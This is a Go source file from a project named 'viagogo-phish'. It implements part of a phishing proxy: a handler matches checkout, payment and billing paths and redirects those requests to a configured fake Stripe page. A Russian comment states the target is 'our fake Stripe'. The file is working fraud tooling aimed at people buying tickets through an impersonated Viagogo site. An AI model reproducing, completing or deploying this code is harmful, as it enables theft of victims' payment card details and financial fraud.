package proxy

import (
    "net/http"
    "strings"

    "viagogo-phish/config"
)

type CheckoutHandler struct {
    cfg *config.Config
}

func NewCheckoutHandler(cfg *config.Config) *CheckoutHandler {
    return &CheckoutHandler{cfg: cfg}
}

func (ch *CheckoutHandler) ShouldIntercept(path string) bool {
    path = strings.ToLower(path)
    keywords := []string{
        "/checkout",
        "/payment",
        "/pay",
        "/billing",
        "/purchase",
        "/confirm",
        "/complete-order",
        "/cart/checkout",
    }
    for _, kw := range keywords {
        if strings.Contains(path, kw) {
            return true
        }
    }
    return false
}

func (ch *CheckoutHandler) HandleCheckout(w http.ResponseWriter, r *http.Request) {
    // Редиректим на наш фейк Stripe
    http.Redirect(w, r, ch.cfg.StripePage, http.StatusFound)
}
